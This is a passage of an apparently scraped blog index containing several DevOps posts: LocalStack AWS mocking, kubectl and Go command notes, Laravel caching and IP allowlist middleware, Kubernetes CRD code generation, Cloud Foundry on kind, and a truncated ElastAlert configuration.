mkdir -p ./localstack/data ./easymock/data/redis ./easymock/data/db mount to container persistent datas\nwhen exec docker-compose up -d . the docker container should be is launched\nthe aws endpoint-url is configured: awsmock.local-dev.com in /etc/hosts file map to 127.0.0.1 You only need to change the appropriate endpoint-url to use them, without the need for sophisticated credentials\nInstall AWS Cli command in Ubuntu\n1 sudo apt-get update 2 sudo apt-get install awscli 3 aws --version Now you can use AWS-cli command create resources:\n1# create a sns 2aws --endpoint-url=http://awsmock.local-dev.com:4575 sns create-topic --name testSns 3#create a sqs 4aws --endpoint-url=http://awsmock.local-dev.com:4576 sqs create-queue --queue-name testSqs --attributes ReceiveMessageWaitTimeSeconds=20 5# get-queue-attributes 6aws --endpoint-url=http://awsmock.local-dev.com:4576 sqs get-queue-attributes --queue-url http://awsmock.local-dev.com:4576/queue/testSqs 7# add attributes for exist sqs 8aws --endpoint-url=http://awsmock.local-dev.com:4576 sqs set-queue-attributes --attributes ReceiveMessageWaitTimeSeconds=15 --queue-url http://awsmock.local-dev.com:4576/queue/testSqs 9#create bucket on s3 in mock 10aws --endpoint-url=http://awsmock.local-dev.com:4572 s3 mb s3://myTestBucket 11# list all sqs 12aws --endpoint-url=http://awsmock.local-dev.com:4576 sqs list-queues 13 14# create the secrets item 15awslocal secretsmanager create-secret \\ 16 --name MyTestSecret \\ 17 --description \u0026#34;My test secret created with the CLI.\u0026#34; \\ 18 --secret-string \u0026#34;{\\\u0026#34;user\\\u0026#34;:\\\u0026#34;diegor\\\u0026#34;,\\\u0026#34;password\\\u0026#34;:\\\u0026#34;EXAMPLE-PASSWORD\\\u0026#34;}\u0026#34; In java code you can implement mock Bean:\n1@Bean 2public AWSSecretsManager awsSecretsManager() { 3 AwsClientBuilder.EndpointConfiguration endpointConfiguration = 4 new AwsClientBuilder.EndpointConfiguration(\u0026#34;http://awsmock.local-dev.com:4584\u0026#34;, 5 \u0026#34;us-east-1\u0026#34;); 6 return AWSSecretsManagerClientBuilder 7 .standard() 8 .withEndpointConfiguration(endpointConfiguration) 9 .withCredentials(new AWSStaticCredentialsProvider(new BasicAWSCredentials(\u0026#34;testKey\u0026#34;, \u0026#34;testSecret\u0026#34;))) 10 .build(); 11} When you use S3 service functions, construct sdk client instance. Must be set 'use_path_style_endpoint' =\u0026gt; true(this PHP key-value settings in clientSdk arguments) .withPathStyleAccessEnabled(true) the java clientSdk implementations\nWhen your code needs to be compatible with both native mocks and production environments, you can set the environment variables, which will not be set in production.\n1if (!empty(env(\u0026#39;AWS_MOCK_SM_URL\u0026#39;, \u0026#39;\u0026#39;))) { 2 $args[\u0026#39;endpoint\u0026#39;] = env(\u0026#39;AWS_MOCK_SM_URL\u0026#39;); 3 } 4$client = new SecretsManagerClient($args); The new version localstack use local aws command don\u0026rsquo;t need include the \u0026ndash;endpoint-url use this python package: python3 -m pip install awscli-local ","link":"https://blog.wisekee.com/post/aws-local-development/","section":"post","tags":["AWS","LocalStack","Cloud"],"title":"Quickly debug AWS App locally use Localstack(AWS Mock in local)"},{"body":"","link":"https://blog.wisekee.com/tags/cache/","section":"tags","tags":null,"title":"cache"},{"body":"When we use the Kubernetes platform,has many commands is important:\nThe k command is alias to kubectl\nlabel for nodes kubectl label nodes host02 disktype=ssd\nview local config for kubernetes context k config get-contexts\nswitch context\u0026rsquo;s namespaces kubectl config set-context my-vsphere-cluster --namespace=helm-test\nforce delete pod, sometimes the pod still terminating.\nk delete pods \u0026lt;pod\u0026gt; -n \u0026lt;namespace\u0026gt; --grace-period=0 --force\nget all resource in current kubernetes cluster\nk get all --all-namespaces\nview job logs\nk logs $(k get pods --selector=job-name=job-1598792400 --output=jsonpath={.items[*].metadata.name})\ntaint the master nodes no execute and no schedule\nkubectl taint nodes \u0026lt;node-name\u0026gt; node-role.kubernetes.io/master=:NoExecute\nkubectl taint nodes \u0026lt;node-name\u0026gt; node-role.kubernetes.io/master=:NoSchedule\nno schedule on nodes: SchedulingDisabled\nk get nodes\nk cordon \u0026lt;node name\u0026gt;\nk uncordon \u0026lt;node name\u0026gt; # cancel cordon back to normal\nwhen shutdown the nodes first exec\nk drain \u0026lt;node name\u0026gt;\nport forward kubectl port-forward service/redis-master 7000:6379\nArbitrary proxy Kubernetes internal Service kubectl proxy then browse the internal service for example: dashboard and metrics\nhttp://localhost:8001/api/v1/namespaces/kube-system/services/kube-state-metrics:http-metrics/proxy/metrics http://localhost:8001/api/v1/namespaces/kubernetes-dashboard/services/https:kubernetes-dashboard:/proxy/.\noperate all resources k delete all --all --namespace=kubesphere-logging-system k get all --all-namespaces\nChange the current context default namespace kubectl config set-context --current --namespace monitoring\ndeployments an echoserver to kubernetes\n1# create deployment 2kubectl create deployment hello-minikube --image=registry.cn-hangzhou.aliyuncs.com/google_containers/echoserver:1.10 3# expose the service 4kubectl expose deployment hello-minikube --type=NodePort --port=8080 tag the nodes 1kubectl tag nodes kube-centos-ceph1 role=storage-node 2kubectl get nodes --show-labels terminating pvc when delete pv stuck kubectl patch pvc db-pv-claim -p '{\u0026quot;metadata\u0026quot;:{\u0026quot;finalizers\u0026quot;:null}}'\nkubectl patch pod db-74755f6698-8td72 -p '{\u0026quot;metadata\u0026quot;:{\u0026quot;finalizers\u0026quot;:null}}'\nHelm download charts source code archive format tgz helm pull \u0026ndash;repo {repo-url} {chart-name} \u0026ndash;version {chart-version} helm pull --repo https://charts.bitnami.com/bitnami metrics-server --version 4.1.4\ntaints the node the effects: \u0026ldquo;NoSchedule,PreferNoSchedule,NoExecute\u0026rdquo; kubectl taint node master node.kubernetes.io/unschedulable:NoSchedule kubectl taint nodes node1 key=value:NoSchedule kubectl taint node -l myLabel=X dedicated=foo:PreferNoSchedule\nremove taints kubectl taint nodes foo dedicated-\nOther usefuly commands 1# Create secrets from literal string pair 2kubectl create secret generic mysql-pass --from-literal=password=xxxxxxx -n wp ","link":"https://blog.wisekee.com/post/k8s-common-command-conclusion/","section":"post","tags":["k8s","kubectl","kubernetes","featured"],"title":"kubernetes operations command summary"},{"body":"","link":"https://blog.wisekee.com/tags/php/","section":"tags","tags":null,"title":"php"},{"body":"use cache library out of laravel framework 1\u0026lt;?php 2 3namespace Company; 4 5 6use Illuminate\\Cache\\CacheManager; 7use Illuminate\\Container\\Container; 8use Illuminate\\Filesystem\\Filesystem; 9 10class FileCache { 11 12 13 private $cacheManager; 14 private $cache; 15 16 private function __construct() 17 { 18 $container = new Container(); 19 $container[\u0026#39;config\u0026#39;] = [ 20 \u0026#39;cache.default\u0026#39; =\u0026gt; \u0026#39;file\u0026#39;, 21 \u0026#39;cache.stores.file\u0026#39; =\u0026gt; [ 22 \u0026#39;driver\u0026#39; =\u0026gt; \u0026#39;file\u0026#39;, 23 \u0026#39;path\u0026#39; =\u0026gt; __DIR__ . \u0026#39;/../../../storage/framework/cache\u0026#39; 24 ] 25 ]; 26 27 $container[\u0026#39;files\u0026#39;] = new Filesystem(); 28 $this-\u0026gt;cacheManager = new CacheManager($container); 29 $this-\u0026gt;cache = $this-\u0026gt;cacheManager-\u0026gt;store(); 30 } 31 32 public static function rememberForever($key, callable $callBack) { 33 return (new static()) 34 -\u0026gt;cache 35 -\u0026gt;rememberForever($key, $callBack); 36 } 37} use file cache get AWS SecretsManager item 1\u0026lt;?php 2 3namespace Company; 4 5use Aws\\Exception\\AwsException; 6use Aws\\SecretsManager\\SecretsManagerClient; 7 8class Configuration 9{ 10 11 private const SECRET_PATTERN = \u0026#39;#/secretsmanager/[^\\s\\n]+#\u0026#39;; 12 13 public static function wrapEnv(string $key): string 14 { 15 $value = Env($key, \u0026#39;\u0026#39;); 16 if (preg_match(static::SECRET_PATTERN, $value)) { 17 return FileCache::rememberForever(\u0026#34;AWS:SM:\u0026#34;.$key, function() use($value) { 18 return Configuration::fetchFromSM($value); 19 }); 20 } 21 22 return $value; 23 } 24 25 public static function fetchFromSM(string $key): string 26 { 27 $args = [ 28 \u0026#39;region\u0026#39; =\u0026gt; env(\u0026#39;AWS_DEFAULT_REGION\u0026#39;, \u0026#39;us-east-1\u0026#39;), 29 \u0026#39;version\u0026#39; =\u0026gt; \u0026#39;2017-10-17\u0026#39;, 30 ]; 31 if (!empty(env(\u0026#39;AWS_MOCK_SM_URL\u0026#39;, \u0026#39;\u0026#39;))) { 32 $args[\u0026#39;endpoint\u0026#39;] = env(\u0026#39;AWS_MOCK_SM_URL\u0026#39;); 33 } 34 $client = new SecretsManagerClient($args); 35 try { 36 $result = $client-\u0026gt;getSecretValue([\u0026#39;SecretId\u0026#39; =\u0026gt; $key,]); 37 } catch (AwsException $ex) { 38 throw $ex; 39 } 40 41 if (isset($result[\u0026#39;SecretString\u0026#39;])) { 42 $value = $result[\u0026#39;SecretString\u0026#39;]; 43 } else { 44 $value = base64_decode($result[\u0026#39;SecretString\u0026#39;]); 45 } 46 47 return $value; 48 } 49 50} ","link":"https://blog.wisekee.com/post/laravel-librarys/","section":"post","tags":["php","cache"],"title":"Php file cache in project"},{"body":"Why does this article exist because when we use Kubesphere. the go client code need to use the client objects of K8s but dosen\u0026rsquo;t provider the s2ibinary object client code. https://github.com/kubesphere/s2ioperator/tree/master/pkg/client/clientset/versioned/typed/devops/v1alpha1\nPrepare directory structure and resource defination files The doc.go include content: 1// +k8s:deepcopy-gen=package,register 2// +k8s:defaulter-gen=TypeMeta 3// +groupName=devops.kubesphere.io 4package v1alpha1 The register.go main defination custom resources GroupName and GroupVersion 1package v1alpha1 2 3import ( 4 \u0026#34;k8s.io/apimachinery/pkg/runtime/schema\u0026#34; 5 \u0026#34;sigs.k8s.io/controller-runtime/pkg/scheme\u0026#34; 6) 7 8type CodeFramework string 9 10const ( 11 Ruby CodeFramework = \u0026#34;ruby\u0026#34; 12 Go CodeFramework = \u0026#34;go\u0026#34; 13 Java CodeFramework = \u0026#34;Java\u0026#34; 14 JavaTomcat CodeFramework = \u0026#34;JavaTomcat\u0026#34; 15 Nodejs CodeFramework = \u0026#34;Nodejs\u0026#34; 16 Python CodeFramework = \u0026#34;python\u0026#34; 17 GroupName string = \u0026#34;devops.kubesphere.io\u0026#34; 18 GroupVersion string = \u0026#34;v1alpha1\u0026#34; 19) 20 21var SchemeGroupVersion = schema.GroupVersion{Group: GroupName, Version: GroupVersion} 22 23var ( 24 SchemeBuilder = \u0026amp;scheme.Builder{GroupVersion: SchemeGroupVersion} 25 AddToScheme = SchemeBuilder.AddToScheme 26) 27 28// Resource is required by pkg/client/listers/... 29func Resource(resource string) schema.GroupResource { 30 return SchemeGroupVersion.WithResource(resource).GroupResource() 31} The types.go mainly include CRD\u0026rsquo;s Object using in library 1package v1alpha1 2 3import ( 4 metav1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; 5) 6 7// +genclient 8// +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object 9// S2iBinary is the Schema for the s2ibinary API 10type S2iBinary struct { 11 metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` 12 metav1.ObjectMeta `json:\u0026#34;metadata,omitempty\u0026#34;` 13 Spec S2iBinarySpec `json:\u0026#34;spec,omitempty\u0026#34;` 14 Status S2iBinaryStatus `json:\u0026#34;status,omitempty\u0026#34;` 15} 16 17type S2iBinarySpec struct { 18 DownloadURL string `json:\u0026#34;downloadURL,omitempty\u0026#34;` 19 FileName string `json:\u0026#34;fileName, omitempty\u0026#34;` 20 Md5 string `json:\u0026#34;md5, omitempty\u0026#34;` 21 Size int `json:\u0026#34;size, omitempty\u0026#34;` 22 UploadTimeStamp string `json:\u0026#34;uploadTimeStamp, omitempty\u0026#34;` 23} 24 25type S2iBinaryStatus struct { 26 Phase string `json:\u0026#34;phase, omitempty\u0026#34;` 27} 28 29// +k8s:deepcopy-gen:interfaces=k8s.io/apimachinery/pkg/runtime.Object 30// S2iBinaryList contains a list of S2iBinary 31type S2iBinaryList struct { 32 metav1.TypeMeta `json:\u0026#34;,inline\u0026#34;` 33 metav1.ListMeta `json:\u0026#34;metadata,omitempty\u0026#34;` 34 Items []S2iBinary `json:\u0026#34;items\u0026#34;` 35} Note: The annotations is important and no blank lines.\nUse Dockerfile as build client code environment 1 FROM golang:1.11.2 2 ENV GO111MODULE=off 3 4 RUN go get k8s.io/code-generator; exit 0 5 RUN go get k8s.io/apimachinery; exit 0 6 RUN go get github.com/spf13/pflag; exit 0 7 RUN go get k8s.io/gengo; exit 0 8 RUN go get k8s.io/klog; exit 0 9 RUN go get golang.org/x/tools; exit 0 10 RUN go get golang.org/x/mod; exit 0 11 RUN go get golang.org/x/xerrors; exit 0 12 ARG repo=\u0026#34;${GOPATH}/src/github.com/xiao.chen/s2ibinary\u0026#34; 13 RUN mkdir -p $repo 14 WORKDIR $GOPATH/src/k8s.io/code-generator 15 VOLUME $repo Use bash script generate clients library 1#!/bin/bash -e 2 3CURRENT_DIR=$(pwd) 4GEN_DIR=$(dirname $0) 5REPO_DIR=\u0026#34;$CURRENT_DIR/$GEN_DIR/\u0026#34; 6 7PROJECT_MODULE=\u0026#34;devops/s2ibinary\u0026#34; 8IMAGE_NAME=\u0026#34;k8s-codegen:latest\u0026#34; 9 10CUSTOM_RESOURCE_NAME=\u0026#34;devops\u0026#34; 11CUSTOM_RESOURCE_VERSION=\u0026#34;v1alpha1\u0026#34; 12 13echo \u0026#34;Building codegen Docker image...\u0026#34; 14docker build -f \u0026#34;${GEN_DIR}/Dockerfile\u0026#34; \\ 15 -t \u0026#34;${IMAGE_NAME}\u0026#34; \\ 16 \u0026#34;${REPO_DIR}\u0026#34; 17 18cmd=\u0026#34;./generate-groups.sh all \\ 19 \u0026#34;$PROJECT_MODULE/pkg/client\u0026#34; \\ 20 \u0026#34;$PROJECT_MODULE/pkg/apis\u0026#34; \\ 21 $CUSTOM_RESOURCE_NAME:$CUSTOM_RESOURCE_VERSION\u0026#34; 22 23echo \u0026#34;Generating client codes...\u0026#34; 24docker run --rm \\ 25 -v \u0026#34;${REPO_DIR}:/go/src/${PROJECT_MODULE}\u0026#34; \\ 26 \u0026#34;${IMAGE_NAME}\u0026#34; $cmd This bash script should take pkg/apis/devops/v1alpha1 generate to client code through doc.go types.go and register.go with types.go file include\u0026rsquo;s annotations\nexectue ./gen-client.sh late, will generate client and deepcopy.go in pkg directory And it turns out there\u0026rsquo;s a simpler way to do it 1package main 2 3import ( 4\tlogs \u0026#34;github.com/prometheus/common/log\u0026#34; 5\t\u0026#34;golang.org/x/net/context\u0026#34; 6\tv1 \u0026#34;k8s.io/apimachinery/pkg/apis/meta/v1\u0026#34; 7\t\u0026#34;k8s.io/apimachinery/pkg/runtime/schema\u0026#34; 8\t\u0026#34;k8s.io/client-go/dynamic\u0026#34; 9\t\u0026#34;snc.com/cleanup/resources/config\u0026#34; 10) 11 12func main() { 13\tk8sClient, err := config.NewK8s() 14\tif err != nil { 15\tlogs.Fatal(\u0026#34;Init kubernetes error.\u0026#34;, err) 16\t} 17\t18\tdyClient, err := dynamic.NewForConfig(k8sClient.Config) 19\tdyResource := dyClient.Resource(schema.GroupVersionResource{Version: \u0026#34;v1alpha1\u0026#34;, Group: \u0026#34;devops.kubesphere.io\u0026#34;, Resource: \u0026#34;s2ibinaries\u0026#34;}) 20\tresult, _ := dyResource.List(context.TODO(), v1.ListOptions{}) 21\tfor _, item := range result.Items { 22\tlogs.Info(\u0026#34;Name:\u0026#34;, item.GetName(), \u0026#34;\\t Namespace: \u0026#34;, item.GetNamespace()) 23\t} 24\t25} Use Dynamic resource interface so easy!\n","link":"https://blog.wisekee.com/post/generate-crds-api-k8s/","section":"post","tags":["Kubernetes","Custom Resources","GO api"],"title":"Automatic generate kubernetes custom resources api go language code"},{"body":"","link":"https://blog.wisekee.com/tags/custom-resources/","section":"tags","tags":null,"title":"Custom Resources"},{"body":"","link":"https://blog.wisekee.com/tags/go-api/","section":"tags","tags":null,"title":"GO api"},{"body":"","link":"https://blog.wisekee.com/tags/cloud-foundry/","section":"tags","tags":null,"title":"Cloud foundry"},{"body":"First prepare the tools installation in host: Kind: https://kind.sigs.k8s.io/docs/user/quick-start/ Cf command: https://docs.cloudfoundry.org/cf-cli/install-go-cli.html HOMEBREW_NO_AUTO_UPDATE=1 brew install cloudfoundry/tap/cf-cli@6 or HOMEBREW_NO_AUTO_UPDATE=1 brew install cloudfoundry/tap/cf-cli@7 Kubectl command: https://kubernetes.io/docs/tasks/tools/install-kubectl/ Helm: https://helm.sh/docs/intro/install/ The Kind must definiation config.yml, refer to expose http(80) and https(443) ports to host machine, because the k8s cluster node ip is internal-ip created by Kind such as: 172.18.0.2\n1kind: Cluster 2apiVersion: kind.x-k8s.io/v1alpha4 3networking: 4 # WARNING: It is _strongly_ recommended that you keep this the default 5 # (127.0.0.1) for security reasons. However it is possible to change this. 6 apiServerAddress: \u0026#34;Host external ip\u0026#34; 7 # This can connect to k8s from external when install kind in virtual host or cloud platform(ec2 of aws) 8 # By default the API server listens on a random open port. 9 # You may choose a specific port but probably don\u0026#39;t need to in most cases. 10 # Using a random port makes it easier to spin up multiple clusters. 11 apiServerPort: 6443 12nodes: 13- role: control-plane 14 # port forward 80 on the host to 80 on this node 15 extraPortMappings: 16 - containerPort: 80 17 hostPort: 80 18 # optional: set the bind address on the host 19 # 0.0.0.0 is the current default 20 listenAddress: \u0026#34;0.0.0.0\u0026#34; 21 # optional: set the protocol to one of TCP, UDP, SCTP. 22 # TCP is the default 23 protocol: TCP 24 - containerPort: 443 25 hostPort: 443 26 listenAddress: \u0026#34;0.0.0.0\u0026#34; 27 protocol: TCP execute command create cluster: kind create cluster --name kubecf --config kind.yaml\nIn order to https://kubecf.suse.dev/docs/tutorials/deploy-kind/ tutorial. setup environment. But need to change something configuration and verstion. Use newest version for cf-operator and kubecf, through this repo url view release detail:\ncf-operator: https://github.com/cloudfoundry-incubator/quarks-operator/releases kubecf: https://github.com/cloudfoundry-incubator/kubecf/releases The helm install look likes following: 1 helm install cf-operator \\ 2 --namespace cfo \\ 3 --set \u0026#34;global.singleNamespace.name=kubecf\u0026#34; \\ 4 https://cf-operators.s3.amazonaws.com/helm-charts/cf-operator-5.0.0%2B0.gd7ac12bc.tgz 5 6 helm install kubecf \\ 7 --namespace kubecf \\ 8 --set \u0026#34;system_domain=kubecf.example.com\u0026#34; \\ 9 --set \u0026#34;features.eirini.enabled=true\u0026#34; \\ 10 --set \u0026#34;features.ingress.enabled=true\u0026#34; \\ 11 https://kubecf.s3.amazonaws.com/kubecf-v2.3.0.tgz Add the nginx ingress component 1helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx 2 3helm install ingress ingress-nginx/ingress-nginx \\ 4--namespace ingress \\ 5--set \u0026#34;tcp.2222=kubecf/scheduler:2222\u0026#34; Change All type is loadbalance in k8s service configuration add yaml section like following: 1 externalIPs: 2 - 172.18.0.2 The node_ip can get through:\n1 kubectl get node kubecf-control-plane \\ 2 --output jsonpath=\u0026#39;{ .status.addresses[?(@.type == \u0026#34;InternalIP\u0026#34;)].address }\u0026#39; Then change ingress controller service config. Cancel tls config: remove tls section in ingress service The backend servicePort change to : 80\nResolves a list of domain names to Host external ip. such as: {api|login|uaa|credhub}.kubecf.example.com and other domain name can view: http://api.kubecf.example.com/ when kubecf is launched Test cf login: cf login --skip-ssl-validation -a https://api.kubecf.example.com -u admin\n","link":"https://blog.wisekee.com/post/setup-cloudfoundry-in-k8s/","section":"post","tags":["Kubernetes","Cloud foundry"],"title":"Install and setup cloud foundry in kubernetes cluster"},{"body":"","link":"https://blog.wisekee.com/tags/ip-whitelist/","section":"tags","tags":null,"title":"Ip whitelist"},{"body":"Temporary ip allow list in PHP framework Laravel 1\u0026lt;?php 2 3namespace App\\Http\\Middleware; 4 5use Closure; 6use Illuminate\\Http\\Request; 7use Illuminate\\Support\\Facades\\Cache; 8use Illuminate\\Support\\Facades\\Log; 9use Symfony\\Component\\HttpFoundation\\IpUtils; 10 11class IpAllowMiddleware 12{ 13 /** 14 * Handle an incoming request. 15 * 16 * @param \\Illuminate\\Http\\Request $request 17 * @param \\Closure $next 18 * @return mixed 19 */ 20 public function handle($request, Closure $next) 21 { 22 $this-\u0026gt;setTrustProxy(); 23 $clientIp = $request-\u0026gt;getClientIp(); 24 if (!$this-\u0026gt;compareOrigin($clientIp)) { 25 Log::warning(\u0026#34;The client ip is forbidden: \u0026#34; . $clientIp); 26 abort(403, \u0026#39;Access denied\u0026#39;); 27 } 28 return $next($request); 29 } 30 31 private function compareOrigin($ip): bool 32 { 33 if (trim($ip) == \u0026#34;\u0026#34;) return false; 34 $ipAllowlist = env(\u0026#34;IP_ALLOW_LIST\u0026#34;, \u0026#34;127.0.0.1, 0.0.0.0/32,::1\u0026#34;); 35 $ips = explode(\u0026#34;,\u0026#34;, $ipAllowlist); 36 $cachekey = md5($ip); 37 return Cache::rememberForever(\u0026#34;IP:ALLOW:\u0026#34; . $cachekey, function () use ($ip, $ips) { 38 return IpUtils::checkIp($ip, $ips); 39 }); 40 } 41 42 private function setTrustProxy() 43 { 44 $proxies = env(\u0026#34;TRUST_PROXY_LIST\u0026#34;, \u0026#34;0.0.0.0/32\u0026#34;); 45 $proxiesArr = explode(\u0026#34;,\u0026#34;, $proxies); 46 Request::setTrustedProxies($proxiesArr, Request::HEADER_X_FORWARDED_ALL); 47 } 48} set system environment when php launched 1 export IP_ALLOW_LIST=\u0026#34;127.0.0.1,::1\u0026#34; 2 export TRUST_PROXY_LIST= \u0026#34;10.244.0.0/16,10.20.0.0/16\u0026#34; ","link":"https://blog.wisekee.com/post/laravel-php-snippets/","section":"post","tags":["PHP","Ip whitelist"],"title":"Laravel ip allowlist request filter middleware"},{"body":"","link":"https://blog.wisekee.com/tags/commands/","section":"tags","tags":null,"title":"Commands"},{"body":"Global install go program(go version \u0026gt;=1.16.0) go install sigs.k8s.io/kind@v0.9.0 when go version is higher 1.12 should install godoc command go get golang.org/x/tools/cmd/godoc launch go docs services in local godoc -http=:6060 view go environment variables,inlude GO ROOT path go env fmt package Println docs go doc fmt Println initialization go modules, when reference sub directory straightway example.com/module/sub1/sub2 go mod init example.com/module delete packages go clean -i -v -x github.com/somepkg/go/simpleGitHub Add modules to current packages go mod edit -require github.com/prometheus/common@v0.1.0 go mod edit -require k8s.io/client-go@0.18.2 or go get k8s.io/client-go@v0.18.2 when use module in local packages. go mod edit -replace github.com/acme/bar=/path/to/local/bar go mod tidy reformat codes in current directory go fmt compile specific os binary program CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -ldflags '-extldflags \u0026quot;-static\u0026quot;' -o app . smallest docker images for go program 1 FROM scratch 2 WORKDIR /app 3 COPY ./app . 4 ENTRYPOINT [\u0026#34;./app\u0026#34;] other practice decrement size when build binary: go build -ldflags='-s -w' check the override variables: go tool vet main.go compile different platform and architecture 1go tool dist list -json 2GOOS=darwin GOARCH=386 go build main.go Cross platform compile 1# use the linux musl gcc in macos to compile with the CGO 2# https://musl.libc.org/ 3# https://github.com/FiloSottile/homebrew-musl-cross 4# brew install FiloSottile/musl-cross/musl-cross 5CC=x86_64-linux-musl-gcc CXX=x86_64-linux-musl-g++ CGO_ENABLED=1 GOOS=linux GOARCH=amd64 go build -trimpath -ldflags=\u0026#34;-s -w -linkmode external -extldflags -static\u0026#34; -o main . Useful tools or frameworks Watches your .go files in a directory and invokes go build Live reload for Go apps ","link":"https://blog.wisekee.com/post/go-usually-commands/","section":"post","tags":["Go","Commands","Featured"],"title":"Go language frequently used command notes"},{"body":"","link":"https://blog.wisekee.com/tags/elastalert/","section":"tags","tags":null,"title":"elastalert"},{"body":"Dynamically generate alarm rules and send email to relative people.based on a given parameter or configuration Elastalert\nThe directory construct look following 1├── elastalert 2├── generate_rule.py 3├── param.json 4├── rules 5└── template You can also through pip install elastalert installing elastalert package. I\u0026rsquo;m going to use it directly here The templatedirectory store tpl file, use this template generate some rules file to rules directory. and used elastalert\nConfiguration file param.json 1{ 2 \u0026#34;dev\u0026#34;: { 3 \u0026#34;public_config\u0026#34;: { 4 \u0026#34;run_every\u0026#34;: 5, 5 \u0026#34;buffer_time\u0026#34;: 15, 6 \u0026#34;es_host\u0026#34;: \u0026#34;dev.es.svc.cluster.local\u0026#34;, 7 \u0026#34;es_port\u0026#34;: 80, 8 \u0026#34;smtp_host\u0026#34;: \u0026#34;email-smtp.us-west-2.amazonaws.com\u0026#34;, 9 \u0026#34;from_addr\u0026#34;: \u0026#34;es-alert@local.com\u0026#34;, 10 \u0026#34;notify_email\u0026#34;: \u0026#34;es-alert@local.com\u0026#34;, 11 \u0026#34;smtp_port\u0026#34;: 25, 12 \u0026#34;email_cc\u0026#34;: [], 13 \u0026#34;alert_subject\u0026#34;: \u0026#34;[DEV][{1}][{0}][ELK Error Log]There are {2} error(s) in last 2 hours\u0026#34;, 14 \u0026#34;alert_subject_args\u0026#34;: \u0026#34;[\u0026#39;app_id\u0026#39;,\u0026#39;ecs_cluster\u0026#39;,\u0026#39;num_hits\u0026#39;]\u0026#34; 15 }, 16 \u0026#34;rules\u0026#34;: { 17 \u0026#34;frontend\u0026#34;: { 18 \u0026#34;name\u0026#34;: \u0026#34;frontend\u0026#34;, 19 \u0026#34;template\u0026#34;: \u0026#34;template/crontab.tpl\u0026#34;, 20 \u0026#34;index_name\u0026#34;: \u0026#34;frontend-*\u0026#34;, 21 \u0026#34;event_num\u0026#34;: 2, 22 \u0026#34;f_time\u0026#34;: 15, 23 \u0026#34;cron\u0026#34;: \u0026#34;0 */2 * * *\u0026#34;, 24 \u0026#34;query_string\u0026#34;: \u0026#34;app_id:frontend AND message:error\u0026#34;, 25 \u0026#34;emails\u0026#34;: [ 26 \u0026#34;dev.elk.errors@local.com\u0026#34; 27 ] 28 }, 29 \u0026#34;nginx\u0026#34;: { 30 \u0026#34;name\u0026#34;: \u0026#34;nginx\u0026#34;, 31 \u0026#34;template\u0026#34;: \u0026#34;template/crontab.tpl\u0026#34;, 32 \u0026#34;index_name\u0026#34;: \u0026#34;nginx-*\u0026#34;, 33 \u0026#34;event_num\u0026#34;: 2, 34 \u0026#34;f_time\u0026#34;: 15, 35 \u0026#34;cron\u0026#34;: \u0026#34;0 */5 * * *\u0026#34;, 36 \u0026#34;query_string\u0026#34;: \u0026#34;app_id:nginx AND status:500 AND message:error\u0026#34;, 37 \u0026#34;emails\u0026#34;: [ 38 \u0026#34;dev.elk.errors@local.com\u0026#34; 39 ] 40 }, 41 \u0026#34;consumer\u0026#34;: { 42 \u0026#34;name\u0026#34;: \u0026#34;consumer\u0026#34;, 43 \u0026#34;template\u0026#34;: \u0026#34;template/crontab.tpl\u0026#34;, 44 \u0026#34;index_name\u0026#34;: \u0026#34;consumer-*\u0026#34;, 45 \u0026#34;event_num\u0026#34;: 3, 46 \u0026#34;f_time\u0026#34;: 15, 47 \u0026#34;cron\u0026#34;: \u0026#34;0 */2 * * *\u0026#34;, 48 \u0026#34;query_string\u0026#34;: \u0026#34;app_id:consumer AND log_level:error\u0026#34;, 49 \u0026#34;emails\u0026#34;: [ 50 \u0026#34;dev.elk.errors@local.com\u0026#34;, 51 \u0026#34;tom@gmail.com\u0026#34; 52 ] 53 }, 54 \u0026#34;provider\u0026#34;: { 55 \u0026#34;name\u0026#34;: \u0026#34;provider\u0026#34;, 56 \u0026#34;template\u0026#34;: \u0026#34;template/crontab.tpl\u0026#34;, 57 \u0026#34;index_name\u0026#34;: \u0026#34;provider-*\u0026#34;, 58 \u0026#34;event_num\u0026#34;: 3, 59 \u0026#34;f_time\u0026#34;: 15, 60 \u0026#34;cron\u0026#34;: \u0026#34;0 */2 * * *\u0026#34;, 61 \u0026#34;query_string\u0026#34;: \u0026#34;app_id:provider AND log_level:error\u0026#34;, 62 \u0026#34;emails\u0026#34;: [ 63 \u0026#34;dev.elk.errors@local.com\u0026#34; 64 ] 65 }, 66 \u0026#34;other-service\u0026#34;: { 67 \u0026#34;name\u0026#34;: \u0026#34;other-service\u0026#34;, 68 \u0026#34;template\u0026#34;: \u0026#34;template/crontab.tpl\u0026#34;, 69 \u0026#34;index_name\u0026#34;: \u0026#34;*\u0026#34;, 70 \u0026#34;event_num\u0026#34;: 3, 71 \u0026#34;f_time\u0026#34;: 15, 72 \u0026#34;cron\u0026#34;: \u0026#34;0 */2 * * *\u0026#34;, 73 \u0026#34;query_string\u0026#34;: \u0026#34;app_id:example-service AND log_level:error\u0026#34;, 74 \u0026#34;emails\u0026#34;: [ 75 \u0026#34;dev.elk.errors@local.com\u0026#34; 76 ] 77 } 78 } 79 }, 80 \u0026#34;qa\u0026#34;: { 81 \u0026#34;public_config\u0026#34;: { 82 \u0026#34;run_every\u0026#34;: 5, 83 \u0026#34;buffer_time\u0026#34;: 15, 84 \u0026#34;es_host\u0026#34;: \u0026#34;qa.es.svc.cluster.local\u0026#34;, 85 \u0026#34;es_port\u0026#34;: 80, 86 \u0026#34;smtp_host\u0026#34;: \u0026#34;email-smtp.us-west-2.amazonaws.com\u0026#34;, 87 \u0026#34;from_addr\u0026#34;: \u0026#34;es-alert@local.com\u0026#34;, 88 \u0026#34;notify_email\u0026#34;: \u0026#34;es-alert@local.com\u0026#34;, 89 \u0026#34;smtp_port\u0026#34;: 25, 90 \u0026#34;email_cc\u0026#34;: [\u0026#34;dev.devops@local.com\u0026#34;], 91 \u0026#34;alert_subject\u0026#34;: \u0026#34;[DEV] ServiceError: {0}\u0026#34;, 92 \u0026#34;alert_subject_args\u0026#34;: \u0026#34;[\u0026#39;app_id\u0026#39;]\u0026#34; 93 }, 94 \u0026#34;rules\u0026#34;: { 95 \u0026#34;account-service\u0026#34;: { 96 \u0026#34;name\u0026#34;: \u0026#34;account-service\u0026#34;, 97 \u0026#34;template\u0026#34;: \u0026#34;template/normal.tpl\u0026#34;, 98 